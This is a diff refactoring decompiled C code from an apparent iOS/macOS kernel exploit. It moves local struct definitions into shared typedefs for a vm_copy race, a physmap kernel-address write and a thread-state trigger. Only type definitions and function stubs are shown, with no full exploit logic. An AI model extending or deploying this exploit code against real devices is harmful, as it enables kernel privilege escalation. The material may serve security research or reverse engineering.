@@ -111,6 +111,49 @@ typedef struct EntitlementIokitThreadArg
   int status;
 } EntitlementIokitThreadArg;
 
+typedef struct VmcopyRaceThreadBlock
+{
+  uint64_t isa;
+  uint64_t flags;
+  void *invoke;
+  void *descriptor;
+  __int64 *state;
+  thread_act_t *targetThread;
+  void *threadList;
+  semaphore_t readySemaphore;
+  semaphore_t resumeSemaphore;
+} VmcopyRaceThreadBlock;
+
+typedef struct VmcopyWritePhysmapBlock
+{
+  uint64_t isa;
+  uint64_t flags;
+  __int64 (__fastcall *invoke)(__int64, unsigned __int8);
+  void *descriptor;
+  __int64 ctx;
+  __int64 kaddr;
+  unsigned __int64 pteIndex;
+  unsigned __int64 pteAddr;
+  unsigned __int64 pageTableBase;
+  vm_size_t size;
+  __int64 savedNext;
+  __int64 savedPrev;
+  int pageShift;
+  mem_entry_name_port_t objectHandle;
+} VmcopyWritePhysmapBlock;
+
+typedef struct VmcopyTriggerThreadBlock
+{
+  uint64_t isa;
+  uint64_t flags;
+  void *invoke;
+  void *descriptor;
+  __int64 ctx;
+  __int64 *state;
+  semaphore_t readySemaphore;
+  semaphore_t resumeSemaphore;
+} VmcopyTriggerThreadBlock;
+
 static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
 {
   memset(scratch, 0, 32);
@@ -7680,46 +7723,6 @@ __int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
 //----- (00000000000111C0) ----------------------------------------------------
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 {
-  struct vmcopy_race_thread_block
-  {
-    uint64_t isa;
-    uint64_t flags;
-    void *invoke;
-    void *descriptor;
-    __int64 *state;
-    thread_act_t *targetThread;
-    __int128 *threadList;
-    semaphore_t readySemaphore;
-    semaphore_t resumeSemaphore;
-  };
-  struct vmcopy_write_physmap_block
-  {
-    uint64_t isa;
-    uint64_t flags;
-    __int64 (__fastcall *invoke)(__int64, unsigned __int8);
-    void *descriptor;
-    __int64 ctx;
-    __int64 kaddr;
-    unsigned __int64 pteIndex;
-    unsigned __int64 pteAddr;
-    unsigned __int64 pageTableBase;
-    vm_size_t size;
-    __int64 savedNext;
-    __int64 savedPrev;
-    int pageShift;
-    mem_entry_name_port_t objectHandle;
-  };
-  struct vmcopy_trigger_thread_block
-  {
-    uint64_t isa;
-    uint64_t flags;
-    void *invoke;
-    void *descriptor;
-    __int64 ctx;
-    __int64 *state;
-    semaphore_t readySemaphore;
-    semaphore_t resumeSemaphore;
-  };
   __int64 *v2; // x20
   unsigned __int64 v3; // x24
   __int64 v4; // x0
@@ -7825,12 +7828,12 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   vm_offset_t v108; // [xsp+F0h] [xbp-610h]
   unsigned __int64 v109; // [xsp+F8h] [xbp-608h]
   vm_address_t v110; // [xsp+100h] [xbp-600h] BYREF
-  struct vmcopy_trigger_thread_block triggerThreadBlock; // [xsp+108h] [xbp-5F8h] BYREF
+  VmcopyTriggerThreadBlock triggerThreadBlock; // [xsp+108h] [xbp-5F8h] BYREF
   natural_t suspendedThreadState[0x44]; // [xsp+140h] [xbp-5C0h] BYREF
-  struct vmcopy_write_physmap_block writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
+  VmcopyWritePhysmapBlock writePhysmapBlock; // [xsp+250h] [xbp-4B0h] BYREF
   vm_address_t v144; // [xsp+2B8h] [xbp-448h] BYREF
   integer_t policy_info[4]; // [xsp+2C0h] [xbp-440h] BYREF
-  struct vmcopy_race_thread_block raceThreadBlock; // [xsp+2D0h] [xbp-430h] BYREF
+  VmcopyRaceThreadBlock raceThreadBlock; // [xsp+2D0h] [xbp-430h] BYREF
   pthread_t v149; // [xsp+310h] [xbp-3F0h] BYREF
   __int64 v150; // [xsp+318h] [xbp-3E8h] BYREF
   vm_address_t v151; // [xsp+320h] [xbp-3E0h] BYREF
@@ -8285,53 +8288,10 @@ LABEL_68:
   return 0;
 }
 
-struct vmcopy_race_thread_block_ref
-{
-  uint64_t isa;
-  uint64_t flags;
-  void *invoke;
-  void *descriptor;
-  __int64 *state;
-  thread_act_t *targetThread;
-  thread_act_t *threadList;
-  semaphore_t readySemaphore;
-  semaphore_t resumeSemaphore;
-};
-
-struct vmcopy_write_physmap_block_ref
-{
-  uint64_t isa;
-  uint64_t flags;
-  __int64 (__fastcall *invoke)(__int64, unsigned __int8);
-  void *descriptor;
-  __int64 ctx;
-  __int64 kaddr;
-  unsigned __int64 pteIndex;
-  unsigned __int64 pteAddr;
-  unsigned __int64 pageTableBase;
-  vm_size_t size;
-  __int64 savedNext;
-  __int64 savedPrev;
-  int pageShift;
-  mem_entry_name_port_t objectHandle;
-};
-
-struct vmcopy_trigger_thread_block_ref
-{
-  uint64_t isa;
-  uint64_t flags;
-  void *invoke;
-  void *descriptor;
-  __int64 ctx;
-  __int64 *state;
-  semaphore_t readySemaphore;
-  semaphore_t resumeSemaphore;
-};
-
 //----- (00000000000125E4) ----------------------------------------------------
 __int64 __fastcall run_exploit_thread(__int64 a1)
 {
-  struct vmcopy_race_thread_block_ref *block = (struct vmcopy_race_thread_block_ref *)a1;
+  VmcopyRaceThreadBlock *block = (VmcopyRaceThreadBlock *)a1;
   __int64 result = 0;
 
   // Paired with the main race loop: wait until the parent has primed the
@@ -8350,7 +8310,7 @@ __int64 __fastcall run_exploit_thread(__int64 a1)
 //----- (0000000000012678) ----------------------------------------------------
 __int64 __fastcall write_kaddr_to_physmap(__int64 a1, unsigned __int8 a2)
 {
-  struct vmcopy_write_physmap_block_ref *block = (struct vmcopy_write_physmap_block_ref *)a1;
+  VmcopyWritePhysmapBlock *block = (VmcopyWritePhysmapBlock *)a1;
   __int64 ctx; // x21
   __int64 pageIndex; // x8
   mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-24h] BYREF
@@ -8377,7 +8337,7 @@ __int64 __fastcall write_kaddr_to_physmap(__int64 a1, unsigned __int8 a2)
 //----- (0000000000012754) ----------------------------------------------------
 __int64 __fastcall trigger_thread_state_mod(__int64 a1)
 {
-  struct vmcopy_trigger_thread_block_ref *block = (struct vmcopy_trigger_thread_block_ref *)a1;
+  VmcopyTriggerThreadBlock *block = (VmcopyTriggerThreadBlock *)a1;
   __int64 ctx; // x20
   thread_act_t targetThread; // w0
 
